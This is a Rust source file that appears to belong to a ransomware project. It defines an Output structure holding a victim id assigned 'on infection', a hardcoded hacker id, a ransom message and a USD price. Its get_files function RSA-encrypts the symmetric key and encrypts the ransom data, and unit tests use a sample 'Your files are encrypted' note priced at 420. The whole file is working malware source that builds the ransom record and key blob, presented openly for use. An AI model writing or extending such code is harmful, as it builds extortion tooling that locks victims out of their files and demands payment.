use std::borrow::BorrowMut;

use anyhow::Error;
use chacha20poly1305::aead::rand_core::RngCore;
use rand::rngs::OsRng;
use rsa::pkcs8::DecodePublicKey;
use rsa::{Oaep, RsaPublicKey};
use serde::{Deserialize, Serialize};
use zeroize::Zeroize;
use zeroize::ZeroizeOnDrop;

use crate::crypto::{encrypt_bytes, BYTES_NONCE_LEN};
use crate::sysinfo::SysInfo;

#[derive(Debug, Serialize, Deserialize, ZeroizeOnDrop)]
pub struct Output {
    pub victim: String, // Victim's id, randomly generated on infection
    pub hacker: String, // Hacker's id, "hardcoded" at compile time
    pub message: String,
    pub price: u64, // price in USD
    pub system_info: SysInfo,
}

impl Output {
    pub fn new(message: String, price: u64, victim: String, hacker: String) -> Self {
        Output {
            message,
            price,
            system_info: SysInfo::new(),
            victim,
            hacker,
        }
    }

    /// Returns `(rsa_encrypted_aes_key, nonce || encrypted_json)`.
    pub fn get_files(&self, pub_key: &str, key: &[u8; 32]) -> Result<(Vec<u8>, Vec<u8>), Error> {
        let rsa_key = RsaPublicKey::from_public_key_pem(pub_key)?;
        let padding = Oaep::new::<sha2::Sha256>();
        let aes_key = rsa_key.encrypt(OsRng.borrow_mut(), padding, key)?;

        let mut json = serde_json::to_string(&self)?;
        let mut nonce = [0u8; BYTES_NONCE_LEN];
        OsRng.fill_bytes(&mut nonce);
        let mut data = encrypt_bytes(json.as_bytes(), key, &nonce)?;

        json.zeroize();
        let mut data_buff = Vec::from(nonce);
        data_buff.append(&mut data);
        Ok((aes_key, data_buff))
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::crypto::KEY_LEN;
    use chacha20poly1305::aead::rand_core::RngCore;
    use rand::rngs::OsRng;

    fn sample_output() -> Output {
        Output::new(
            "Your files are encrypted".to_string(),
            420,
            "victim-1234".to_string(),
            "hacker-5678".to_string(),
        )
    }

    #[test]
    fn output_serialization_roundtrip() {
        let original = sample_output();
        let json = serde_json::to_string(&original).unwrap();
        let parsed: Output = serde_json::from_str(&json).unwrap();
        assert_eq!(parsed.victim, original.victim);
        assert_eq!(parsed.hacker, original.hacker);
        assert_eq!(parsed.message, original.message);
        assert_eq!(parsed.price, original.price);
        assert_eq!(parsed.system_info.core_count, original.system_info.core_count);
        assert_eq!(parsed.system_info.host_name, original.system_info.host_name);
    }

    #[test]
    fn get_files_uses_rsa_pem_key() {
        // Use a fresh RSA keypair serialized as PEM.
        let mut rng = rand::thread_rng();
        let bits = 2048;
        let private_key = rsa::RsaPrivateKey::new(&mut rng, bits).unwrap();
        let public_key = rsa::RsaPublicKey::from(&private_key);
        let pem = rsa::pkcs8::EncodePublicKey::to_public_key_pem(&public_key, rsa::pkcs8::LineEnding::LF).unwrap();

        let output = sample_output();
        let mut key = [0u8; KEY_LEN];
        OsRng.fill_bytes(&mut key);
        let (rsa_blob, data_blob) = output.get_files(&pem, &key).unwrap();

        // RSA blob should decrypt back to the 32-byte symmetric key.
        let padding = Oaep::new::<sha2::Sha256>();
        let decrypted = private_key.decrypt(padding, &rsa_blob).unwrap();
        assert_eq!(decrypted.as_slice(), &key);

        // Data blob is `outer_nonce(24) || encrypt_bytes(...)` where
        // encrypt_bytes itself prepends a nonce, i.e. `nonce || nonce || ct`.
        // The decrypt tool reads the first 24 bytes and discards them, then
        // passes the remainder to decrypt_bytes. Mirror that here.
        assert!(data_blob.len() > BYTES_NONCE_LEN);
        let inner = &data_blob[BYTES_NONCE_LEN..];
        let decrypted_json = crate::crypto::decrypt_bytes(inner, &key).unwrap();
        let parsed: Output = serde_json::from_slice(&decrypted_json).unwrap();
        assert_eq!(parsed.message, output.message);
        assert_eq!(parsed.price, output.price);
    }
}
